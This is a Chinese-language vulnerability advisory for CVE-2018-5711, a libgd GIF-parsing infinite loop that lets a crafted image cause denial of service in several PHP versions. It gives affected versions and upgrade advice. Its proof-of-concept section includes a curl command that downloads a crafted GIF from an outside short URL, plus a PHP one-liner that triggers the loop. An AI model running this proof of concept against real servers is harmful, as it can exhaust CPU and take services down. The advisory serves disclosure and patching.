# 漏洞预警 | Libgd拒绝服务漏洞通告（CVE-2018-5711）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAwNDE4Mzc1NA==&mid=2650825632&idx=1&sn=28ec7e0614aa5d5bfd6ff3b26c0de8c6&chksm=80db0005b7ac8913134de18ad2b35df3a9a73edc67bb10ec257874a3a33700d8b93aee8169a5&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAwNDE4Mzc1NA==&mid=2650825632&idx=1&sn=28ec7e0614aa5d5bfd6ff3b26c0de8c6&chksm=80db0005b7ac8913134de18ad2b35df3a9a73edc67bb10ec257874a3a33700d8b93aee8169a5&scene=27#wechat_redirect)

尊敬的客户：

       libgd爆出拒绝服务漏洞，该漏洞详情如下：

**1.综述**

       GD Graphics Library（libgd）是用来动态创建图像的开源图形软件库。

       GD Graphics Library中的gd\_gif\_in.c存在拒绝服务漏洞。在受影响版本内的PHP存在签名错误，通过构造的GIF文件调用PHP函数imagecreatefromgif或imagecreatefromstring可导致无限循环。远程攻击者可利用该漏洞造成拒绝服务攻击。

**2.漏洞概述  
**

       漏洞类型：拒绝服务漏洞

       危险等级： 高危

       利用条件： PHP在受影响版本内，并且使用了libgd库

       受影响系统： PHP 5 < 5.6.33、PHP 7.0 < 7.0.27、PHP 7.1 < 7.1.13、PHP 7.2 < 7.2.1

**3.漏洞编号**

       CVE-2018-5711   libgd拒绝服务漏洞

**4.漏洞描述**

       GD Graphics Library中的gd\_gif\_in.c存在拒绝服务漏洞。在受影响版本内的PHP存在签名错误，通过构造的GIF文件调用PHP函数imagecreatefromgif或imagecreatefromstring可导致无限循环。远程攻击者可利用该漏洞造成拒绝服务攻击。

** 5.漏洞利用（POC)**

       $ curl -L https://git.io/vN0n4 | xxd -r > poc.gif

       $ php -r 'imagecreatefromgif("poc.gif");'

       Infinite loop here.. 

     （该poc具备提高服务器CPU负载/引发服务器宕机能力，建议谨慎测试）

** 6.修复建议**

      升级PHP至官方最新版本

      下载地址：http://php.net/downloads.php

       如PHP版本暂时无法升级，该漏洞缓解措施如下：

       1. 如不影响业务且该PHP服务器需要处理图片可使用Imagick库或Grafika库等其它图片处理库；
